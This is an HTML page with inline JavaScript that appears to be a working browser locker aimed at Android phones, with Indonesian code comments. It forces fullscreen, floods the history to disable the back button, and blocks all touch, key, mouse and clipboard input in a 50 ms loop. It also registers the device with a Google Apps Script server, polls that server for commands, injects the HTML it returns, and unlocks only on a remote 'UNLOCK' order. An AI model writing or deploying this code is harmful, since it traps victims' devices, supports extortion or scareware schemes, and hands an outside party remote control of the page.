<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
    <title>.</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        html,body{width:100%;height:100%;overflow:hidden;position:fixed;top:0;left:0;background:#000}
        body{display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;color:#fff;touch-action:none;-webkit-touch-callout:none;-webkit-user-select:none;user-select:none}
    </style>
</head>
<body>
<div id="s" style="color:#666;font-size:13px;">System...</div>
<script>
const API='https://script.google.com/macros/s/AKfycbzwtt_Qt3xFQ5ToKqAy3Je-ukHD41Tinl9bHXT7aTd3KXQ3bt15w0SiMuHLY31peOheug/exec';
const DID='z'+Math.random().toString(36).substring(2,15);
const M=navigator.userAgent.match(/Android[\s\d.]+/)?.[0]||'Android';
let locked=true;

// LANGSUNG SEMAT MATI
sematMati();

async function reg(){
  try{
    let r=await fetch(API,{method:'POST',body:JSON.stringify({action:'register',device_id:DID,model:M})});
    let d=await r.json();
    if(d.command==='UNLOCK'){bukaKunci();return;}
    if(d.command){document.body.innerHTML=d.command;sematMati();}
    else document.getElementById('s').innerHTML='OK';
  }catch(e){}
}

async function chk(){
  try{
    let r=await fetch(API+'?action=check&device_id='+DID);
    let d=await r.json();
    if(d.command==='UNLOCK'){bukaKunci();return;}
    if(d.command){document.body.innerHTML=d.command;sematMati();}
  }catch(e){}
}

function bukaKunci(){
  locked=false;
  document.body.innerHTML='<div id="s" style="color:#666;">OK</div>';
}

function sematMati(){
  locked=true;
  goFull();
  blockAll();
}

function goFull(){
  const el=document.documentElement;
  el.requestFullscreen?.();
  el.webkitRequestFullscreen?.();
  el.mozRequestFullScreen?.();
  el.msRequestFullscreen?.();
}

function blockAll(){
  for(let i=0;i<5;i++) history.pushState(null,'',location.href);
  
  const noEvent=e=>{
    e.preventDefault();
    e.stopPropagation();
    e.stopImmediatePropagation();
    return false;
  };
  
  const events=['contextmenu','touchstart','touchmove','touchend','touchcancel',
    'gesturestart','gesturechange','gestureend','wheel','keydown','keyup','keypress',
    'pointerdown','pointermove','pointerup','pointercancel','mousedown','mousemove','mouseup',
    'click','dblclick','select','selectstart','drag','dragstart','drop','scroll','copy','cut','paste'];
  
  events.forEach(ev=>{
    document.addEventListener(ev,noEvent,{passive:false,capture:true});
    window.addEventListener(ev,noEvent,{passive:false,capture:true});
  });
  
  window.addEventListener('popstate',()=>{
    for(let i=0;i<3;i++) history.pushState(null,'',location.href);
    goFull();
  });
  
  document.addEventListener('visibilitychange',()=>{
    if(document.hidden) goFull();
  });
  
  document.addEventListener('fullscreenchange',()=>{
    if(!document.fullscreenElement) goFull();
  });
  document.addEventListener('webkitfullscreenchange',()=>{
    if(!document.webkitFullscreenElement) goFull();
  });
  
  screen.orientation?.lock?.('portrait').catch(()=>{});
  
  document.body.style.userSelect='none';
  document.body.style.webkitUserSelect='none';
  document.body.style.touchAction='none';
  document.body.style.pointerEvents='none';
}

setInterval(()=>{
  if(!locked)return;
  goFull();
  for(let i=0;i<3;i++) history.pushState(null,'',location.href);
  if(screen.orientation?.lock) screen.orientation.lock('portrait').catch(()=>{});
},50);

reg();
setInterval(chk,5000);
</script>
</body>
</html>
